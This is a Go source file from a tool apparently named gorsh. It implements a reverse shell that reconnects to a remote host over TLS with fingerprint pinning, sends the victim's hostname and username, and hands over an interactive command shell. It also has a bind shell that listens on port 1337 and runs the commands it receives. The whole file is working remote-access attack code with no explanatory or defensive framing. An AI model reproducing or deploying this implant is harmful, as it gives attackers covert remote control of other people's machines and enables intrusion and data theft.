package core

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"git.hyrule.link/blink/gorsh/pkg/cmds"
	"git.hyrule.link/blink/gorsh/pkg/myconn"
	"git.hyrule.link/blink/gorsh/pkg/sitrep"
	"github.com/abiosoft/ishell"
	"github.com/abiosoft/readline"
)

const (
	ErrCouldNotDecode  = 1 << iota
	ErrHostUnreachable = iota
	ErrBadFingerprint  = iota
)

func InitReverseShell(connectString string, fingerprint []byte) {
	config := &tls.Config{InsecureSkipVerify: true}

	for {

		var err error
		tlsConn, err := tls.Dial("tcp", connectString, config)
		if err == nil {
			ok := isValidKey(tlsConn, fingerprint)
			if !ok {
				os.Exit(ErrBadFingerprint)
			}
			myconn.Conn = tlsConn
			StartShell(&myconn.Conn)
		}

		log.Printf("%s unreachable, trying agian in 5 seconds", connectString)
		time.Sleep(5 * time.Second)
	}
}

func StartShell(conn *myconn.Writer) {
	sh := NewIShell(conn)
	// defer myconn.Conn.Close()
	defer sh.Close()

	host, _ := sitrep.HostInfo()
	user, _ := sitrep.UserInfo()

	// gather initial details to send to the receiver
	myconn.Send(myconn.Conn, host.Hostname)
	myconn.Send(myconn.Conn, user.Username)

	sh.Run()
}

func NewIShell(conn *myconn.Writer) *ishell.Shell {
	hostname, _ := os.Hostname()
	conf := &readline.Config{
		Prompt:              fmt.Sprintf("[%s]> ", hostname),
		Stdin:               *conn,
		StdinWriter:         *conn,
		Stdout:              *conn,
		Stderr:              *conn,
		FuncIsTerminal:      func() bool { return true },
		ForceUseInteractive: true,
		// VimMode:             true,
		// UniqueEditLine:      true,
		// FuncMakeRaw:         func() error { return nil },
		// FuncExitRaw:         func() error { return nil },
	}

	sh := ishell.NewWithConfig(conf)

	cmds.RegisterCommands(sh)
	cmds.RegisterWindowsCommands(sh)
	cmds.RegisterNotWindowsCommands(sh)

	return sh
}

func BindShell() {
	go func() {
		listener, err := net.Listen("tcp", ":1337")
		if err != nil {
			log.Printf("Listen Error: %s\n", err)
			return
		}
		defer listener.Close()

		log.Println("Listening...")
		for {
			var conn myconn.Writer
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("Listener Accept Error: %s\n", err)
				continue
			}
			sh := NewIShell(&conn)

			go func(conn myconn.Writer) {
				for {
					log.Println("Accepted a request. Reading content")
					var input []byte
					stream := bufio.NewReader(conn)
					input, _, err := stream.ReadLine()
					if err != nil {
						log.Printf("Listener: Read error: %s", err)
					}
					log.Printf("RECEIVED: %s\n", input)
					sh.Process(string(input))
				}
			}(conn)
		}
	}()
}

func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid
}
